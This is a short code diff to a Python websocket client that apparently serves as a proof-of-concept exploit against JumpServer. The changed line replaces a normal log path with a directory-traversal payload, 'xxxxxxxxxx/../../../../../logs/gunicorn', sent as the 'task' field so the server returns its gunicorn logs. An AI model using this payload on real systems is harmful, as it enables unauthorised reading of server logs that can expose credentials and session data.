@@ -11,7 +11,7 @@ from ws4py.client.threadedclient import WebSocketClient
 class ws_long(WebSocketClient):
 
     def opened(self):
-        req = '{"task":"/opt/jumpserver/logs/jumpserver"}'
+        req = '{"task":"xxxxxxxxxx/../../../../../logs/gunicorn"}'
         self.send(req)
 
     def closed(self, code, reason=None):
